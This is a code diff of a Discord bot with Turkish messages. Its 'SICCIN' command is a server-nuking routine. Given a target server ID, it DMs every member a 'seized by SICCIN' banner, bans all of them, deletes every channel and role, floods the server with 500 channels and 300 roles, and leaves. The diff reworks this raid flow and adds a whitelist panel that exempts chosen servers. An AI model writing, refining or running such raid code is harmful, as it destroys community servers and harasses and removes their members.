@@ -1,10 +1,13 @@
-require("dotenv").config();
+require('dotenv').config();
 const {
   Client, GatewayIntentBits, Partials,
   EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle,
   ModalBuilder, TextInputBuilder, TextInputStyle,
-  StringSelectMenuBuilder, ActivityType
-} = require("discord.js");
+  StringSelectMenuBuilder,
+  ActivityType
+} = require('discord.js');
+
+const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
 
 const client = new Client({
   intents: [
@@ -12,30 +15,38 @@ const client = new Client({
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
     GatewayIntentBits.GuildMembers,
-    GatewayIntentBits.GuildPresences,
-    GatewayIntentBits.DirectMessages
+    GatewayIntentBits.GuildPresences
   ],
   partials: [Partials.Channel]
 });
 
+// ENV
 const OWNER_ID = process.env.OWNER_ID;
 const SERI_ID = process.env.SERI_ID;
 const WL_KANAL_ID = process.env.WL_KANAL_ID;
+const BOT_TOKEN = process.env.BOT_TOKEN;
 
+// DATA
+let cachedVideo = null;
 let whitelist = {};
 let whitelistMessageId = null;
 
-// ================= STATUS KONTROL =================
-function hasSiccinStatus(member) {
-  if (!member?.presence?.activities) return false;
-  return member.presence.activities.some(act =>
-    act.type === ActivityType.Custom &&
-    act.state &&
-    (act.state.includes("/siccin") || act.state.includes(".gg/siccin"))
-  );
-}
+// ================== BOT READY ==================
+client.once("ready", async () => {
+  console.log(`🚀 Bot aktif: ${client.user.tag}`);
 
-// ================= WHITELIST MESAJ =================
+  const videoURL = "https://raw.githubusercontent.com/ForsDev101/Securitybot/main/ssstik.io_goktug_twd_1763930201787.mp4";
+  try {
+    const res = await fetch(videoURL);
+    const buffer = Buffer.from(await res.arrayBuffer());
+    cachedVideo = { attachment: buffer, name: "video.mp4" };
+    console.log("🎥 Video cachelendi");
+  } catch (err) {
+    console.log("❌ Video cache hatası:", err);
+  }
+});
+
+// ================== WHITELIST MESAJ ==================
 async function updateWhitelistMessage(channel) {
   let description = "📜 **WHITELIST SUNUCULAR**\n\n";
   for (const id in whitelist) {
@@ -51,46 +62,102 @@ async function updateWhitelistMessage(channel) {
   whitelistMessageId = msg.id;
 }
 
-// ================== .SICCIN ==================
+// ================== DURUM KONTROL ==================
+function hasSiccinStatus(member) {
+  if (!member?.presence?.activities) return false;
+
+  return member.presence.activities.some(act =>
+    act.type === ActivityType.Custom &&
+    act.state &&
+    (act.state.includes("/siccin") || act.state.includes(".gg/siccin"))
+  );
+}
+
+// ================== SICCCIN COMMAND ==================
 async function siccinCommand(message) {
-  if (![OWNER_ID, SERI_ID].includes(message.author.id))
+  if (![OWNER_ID, SERI_ID].includes(message.author.id)) {
     return message.reply("❌ Bu komutu sadece OWNER veya SERI kullanabilir.");
+  }
 
   const member = await message.guild.members.fetch(message.author.id);
   if (!hasSiccinStatus(member)) {
-    return message.reply("❌ Durumunda `/siccin` veya `.gg/siccin` yok.");
+    return message.reply("❌ Durumunda `/siccin` veya `.gg/siccin` yok, kullanamazsın.");
   }
 
-  const row = new ActionRowBuilder().addComponents(
-    new ButtonBuilder()
-      .setCustomId("siccinStart")
-      .setLabel("ＳＩＣＣＩＮ")
-      .setStyle(ButtonStyle.Secondary)
+  const modal = new ModalBuilder()
+    .setCustomId("siccinModal")
+    .setTitle("ＳＩＣＣＩＮ Başlat");
+
+  modal.addComponents(
+    new ActionRowBuilder().addComponents(
+      new TextInputBuilder()
+        .setCustomId("targetGuildID")
+        .setLabel("Hedef Sunucu ID")
+        .setStyle(TextInputStyle.Short)
+        .setRequired(true)
+    )
   );
 
-  const embed = new EmbedBuilder()
-    .setColor("DarkRed")
-    .setTitle("ＳＩＣＣＩＮ EJECTED")
-    .setDescription(`ＳＩＣＣＩＮ Tarafından ${message.guild.name} Sunucusuna El Konulmuştur\n#GLORY TO ＳＩＣＣＩＮ\ndiscord.gg/siccin`)
-    .setThumbnail(message.guild.iconURL({ dynamic: true }));
+  return message.showModal(modal);
+}
 
-  await message.channel.send({ embeds: [embed], components: [row] });
+// ================== PANEL ==================
+async function openPanel(message) {
+  if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;
+
+  const embed = new EmbedBuilder()
+    .setTitle("⚡ Vendetta Panel")
+    .setDescription("Sistem seçiniz")
+    .setColor("Grey");
+
+  const selectRow = new ActionRowBuilder().addComponents(
+    new StringSelectMenuBuilder()
+      .setCustomId("panelMenu")
+      .addOptions([{ label: "Whitelist Sistemi", value: "whitelist" }])
+  );
+
+  await message.reply({
+    embeds: [embed],
+    files: cachedVideo ? [cachedVideo] : [],
+    components: [selectRow],
+    ephemeral: true
+  });
 }
 
 // ================== INTERACTIONS ==================
 client.on("interactionCreate", async interaction => {
-  if (interaction.isButton() && interaction.customId === "siccinStart") {
+
+  // PANEL MENU
+  if (interaction.isStringSelectMenu() && interaction.customId === "panelMenu") {
+    const embed = new EmbedBuilder()
+      .setTitle("Whitelist Sistemi")
+      .setDescription("Bir işlem seç")
+      .setColor("Blue");
+
+    const row = new ActionRowBuilder().addComponents(
+      new StringSelectMenuBuilder()
+        .setCustomId("wlMenu")
+        .addOptions([
+          { label: "Whitelist Ekle", value: "wlEkle" },
+          { label: "Whitelist Çıkar", value: "wlCikar" }
+        ])
+    );
+
+    return interaction.update({ embeds: [embed], components: [row] });
+  }
+
+  // WL MENU
+  if (interaction.isStringSelectMenu() && interaction.customId === "wlMenu") {
     const modal = new ModalBuilder()
-      .setCustomId("siccinModal")
-      .setTitle("Hedef Sunucu ID");
+      .setCustomId(interaction.values[0])
+      .setTitle("Whitelist İşlemi");
 
     modal.addComponents(
       new ActionRowBuilder().addComponents(
         new TextInputBuilder()
           .setCustomId("guildID")
-          .setLabel("Hedef Sunucu ID")
+          .setLabel("Sunucu ID")
           .setStyle(TextInputStyle.Short)
-          .setPlaceholder("1111111111111111")
           .setRequired(true)
       )
     );
@@ -98,48 +165,74 @@ client.on("interactionCreate", async interaction => {
     return interaction.showModal(modal);
   }
 
-  if (interaction.isModalSubmit() && interaction.customId === "siccinModal") {
-    const guildId = interaction.fields.getTextInputValue("guildID");
-    const guild = client.guilds.cache.get(guildId);
+  // WL MODAL & SICCCIN MODAL
+  if (interaction.isModalSubmit()) {
+    const wlChannel = await client.channels.fetch(WL_KANAL_ID);
 
-    if (!guild) return interaction.reply({ content: "❌ Bot bu sunucuda yok.", ephemeral: true });
-    if (whitelist[guildId]) return interaction.reply({ content: "⚠️ Sunucu whitelist'te", ephemeral: true });
+    // WHITELIST
+    if (interaction.customId === "wlEkle") {
+      const guildID = interaction.fields.getTextInputValue("guildID");
+      const guild = client.guilds.cache.get(guildID);
+      if (!guild) return interaction.reply({ content: "Sunucu bulunamadı", ephemeral: true });
 
-    await interaction.reply({ content: "💣 ＳＩＣＣＩＮ başlatıldı", ephemeral: true });
+      const owner = await guild.fetchOwner().catch(() => null);
+      whitelist[guildID] = {
+        name: guild.name,
+        ownerTag: owner ? owner.user.tag : "Unknown"
+      };
 
-    // Embed DM
-    const embedDM = new EmbedBuilder()
-      .setColor("DarkRed")
-      .setTitle("ＳＩＣＣＩＮ EJECTED")
-      .setThumbnail(guild.iconURL({ dynamic: true }))
-      .setDescription(`ＳＩＣＣＩＮ Tarafından ${guild.name} Sunucusuna El Konulmuştur\n#GLORY TO ＳＩＣＣＩＮ\ndiscord.gg/siccin`);
-
-    const members = await guild.members.fetch();
-
-    // BAN + DM paralel
-    await Promise.all(members.map(m => {
-      if (m.user.bot) return;
-      m.send({ embeds: [embedDM] }).catch(() => {});
-      return m.ban({ reason: "ＳＩＣＣＩＮ" }).catch(() => {});
-    }));
-
-    // Kanalları sil + 500 yeni kanal oluştur
-    await Promise.all(guild.channels.cache.map(c => c.delete().catch(() => {})));
-    for (let i = 0; i < 500; i++) {
-      guild.channels.create({ name: "ＳＩＣＣＩＮ🔱", type: 0 }).catch(() => {});
+      await updateWhitelistMessage(wlChannel);
+      return interaction.reply({ content: "✅ Whitelist eklendi", ephemeral: true });
     }
 
-    // Rolleri sil + 300 yeni rol oluştur
-    await Promise.all(guild.roles.cache.filter(r => !r.managed).map(r => r.delete().catch(() => {})));
-    for (let i = 0; i < 300; i++) {
-      guild.roles.create({ name: `ＳＩＣＣＩＮ-${i}`, color: "Red" }).catch(() => {});
+    if (interaction.customId === "wlCikar") {
+      const guildID = interaction.fields.getTextInputValue("guildID");
+      delete whitelist[guildID];
+      await updateWhitelistMessage(wlChannel);
+      return interaction.reply({ content: "🗑️ Whitelist çıkarıldı", ephemeral: true });
     }
 
-    // Log OWNER
-    const owner = await client.users.fetch(OWNER_ID).catch(() => null);
-    if (owner) owner.send(`✅ ＳＩＣＣＩＮ tamamlandı\nSunucu: ${guild.name} (${guild.id})`);
+    // SICCCIN MODAL
+    if (interaction.customId === "siccinModal") {
+      const guildId = interaction.fields.getTextInputValue("targetGuildID");
+      const guild = client.guilds.cache.get(guildId);
 
-    await guild.leave().catch(() => {});
+      if (!guild) return interaction.reply({ content: "Bot bu sunucuda değil", ephemeral: true });
+      if (whitelist[guildId]) return interaction.reply({ content: "⚠️ Sunucu whitelist'te", ephemeral: true });
+
+      await interaction.reply({ content: "💣 ＳＩＣＣＩＮ İşlemi Başlatıldı", ephemeral: true });
+
+      const ownerDM = await client.users.fetch(OWNER_ID).catch(() => null);
+      const embedDM = new EmbedBuilder()
+        .setColor("#8B0000")
+        .setTitle("ＳＩＣＣＩＮ EJECTED")
+        .setThumbnail(guild.iconURL({ dynamic: true }))
+        .setDescription(`ＳＩＣＣＩＮ Tarafından **${guild.name}** Sunucusuna El Konulmuştur\n#GLORY TO ＳＩＣＣＩＮ\nhttps://discord.gg/siccin`);
+      if (ownerDM) ownerDM.send({ embeds: [embedDM] }).catch(() => {});
+
+      const members = await guild.members.fetch();
+      const tasks = [];
+
+      for (const m of members.values()) {
+        if (m.user.bot) continue;
+        tasks.push(m.send({ embeds: [embedDM] }).catch(() => {}));
+        tasks.push(m.ban({ reason: "ＳＩＣＣＩＮ" }).catch(() => {}));
+      }
+
+      // Kanalları ve rolleri sil + 500 kanal 300 rol oluştur
+      for (const c of guild.channels.cache.values()) tasks.push(c.delete().catch(() => {}));
+      for (const r of guild.roles.cache.values()) tasks.push(r.delete().catch(() => {}));
+
+      for (let i = 0; i < 500; i++) {
+        tasks.push(guild.channels.create({ name: "ＳＩＣＣＩＮ 🔱" }).catch(() => {}));
+      }
+      for (let i = 0; i < 300; i++) {
+        tasks.push(guild.roles.create({ name: "ＳＩＣＣＩＮ 🔱" }).catch(() => {}));
+      }
+
+      await Promise.all(tasks);
+      await guild.leave().catch(() => {});
+    }
   }
 });
 
@@ -149,7 +242,8 @@ client.on("messageCreate", async message => {
 
   const cmd = message.content.toLowerCase();
 
-  if (cmd === ".siccin") return siccinCommand(message);
+  if (cmd === ".vndt") return openPanel(message);
+  if (cmd === "/siccin") return siccinCommand(message);
 });
 
-client.login(process.env.BOT_TOKEN);
+client.login(BOT_TOKEN);
